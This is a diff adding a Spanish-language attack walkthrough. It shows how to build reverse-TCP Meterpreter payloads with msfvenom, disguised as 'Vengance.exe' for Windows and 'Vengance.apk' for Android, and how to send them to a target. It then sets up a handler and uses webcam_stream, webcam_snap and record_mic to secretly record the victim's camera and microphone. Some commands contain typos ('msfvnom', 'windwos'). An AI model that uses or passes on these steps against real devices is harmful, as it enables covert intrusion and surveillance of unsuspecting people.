@@ -1,0 +1,58 @@
+PARA WINDOWS
+Primera terminal
+ifconfig
+
+Segunda termnal
+msfvnom -p windwos/meterpreter/reverse_tcp LHOST="Dirección_IP_Kali" LPORT=4444 -f exe -o Vengance.exe/////en mi caso utilizo el puerto "4444"
+con esto ya estara creado el ataque y listo para enviarlo
+
+Tercera terminal
+Una vez enviado abrimos otra terminal y realizamos lo siguiente:
+msfconsole
+msf5.-use exploit/multi/handler
+--------- set payload windows/meterpreter/reverse_tcp
+set LHOST=Dirección IP de Kali
+set LPORT=4444
+show options////para ver si nos conecto correctamente
+
+
+exploit
+///////help/// este para ver los comandos del exploit 
+webcam_list-------lista de las camaras			        !tambien tenemos las opciones de 
+usaremos record_mic---grabacion de audio 			!webcam snap/// para la captura de imagen
+usaremos webcam_stream/// para grabar video 			!webcam_chat/// inia video chat 
+
+Opcion del video en kali linux 
+Dela siguiente manera:
+webcam_list///lista de las camaras del ordenador
+webcam_stream 1/// iniciamos la grabacion con la primera camara del ordendor 
+
+
+Opcion del audio en windows
+record_mic -d 5///grabamos audio y le damos el tiempo de duracion
+
+PARA ANDROID 
+Mismos puerto y rutas
+msfvnom -p android/meterpreter/reverse_tcp LHOST="Dirección_IP_Kali" LPORT=4444 -o $HOME/Vengance.apk                     ES -o   O    R>
+msfconsole
+-.-.--use exploit/multi/handler
+-..-..set payload android/meterpreter/reverse_tcp
+set LHOST=Dirección_IP_Kali
+set LPORT=4444
+show options
+
+exploit
+////////help////para ver los comandos del exploit en android 
+webcam_list-------lista de las camaras			        !tambien tenemos las opciones de 
+usaremos record_mic---grabacion de audio 			!webcam snap//Para capturar una imagen
+usaremos webcam_stream --grabacion de video 			!webcam_chat//Inicia un video chat
+
+
+Opcion del video en android
+Dela siguiente manera:
+webcam_list///lista de camaras
+webcam_stream 2///Solo nos permite grabar con la camara trasera 
+
+
+Opcion del audio en android 
+record_mic -d 5///grabamos audio y le damos el tiempo de duracion
